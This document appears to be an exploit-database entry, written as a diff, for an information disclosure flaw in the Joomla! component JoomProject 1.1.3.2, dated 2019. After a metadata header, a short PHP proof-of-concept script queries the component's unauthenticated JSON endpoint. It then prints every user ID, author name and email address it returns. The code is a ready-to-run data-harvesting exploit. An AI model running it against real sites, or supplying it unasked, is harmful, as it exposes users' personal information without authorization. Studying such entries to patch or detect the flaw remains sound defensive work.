@@ -1,0 +1,29 @@
+# Exploit Title: Joomla! Component JoomProject 1.1.3.2 - Information Disclosure
+# Dork: N/A
+# Date: 2019-01-11
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: http://joomboost.com/
+# Software Link: https://extensions.joomla.org/extensions/extension/clients-a-communities/project-a-task-management/joomproject/
+# Version: 1.1.3.2
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1) 
+<?php
+header ('Content-type: text/html; charset=UTF-8');
+$url= "http://localhost/[PATH]/";
+$p="index.php?option=com_jpprojects&view=projects&tmpl=component&format=json";
+$url = file_get_contents($url.$p);
+$l = json_decode($url, true);
+if($l){
+	echo "*-----------------------------*<br />";
+foreach($l as $u){
+	echo "[-] ID\n\n\n\n:\n" .$u['id']."<br />";
+	echo "[-] Name\n\n:\n" .$u['author_name']."<br />";
+	echo "[-] Email\n:\n" .$u['author_email']."<br />";
+	echo "<br>";
+}echo "*-----------------------------*";} 
+else{echo "[-] No user";}
+?>
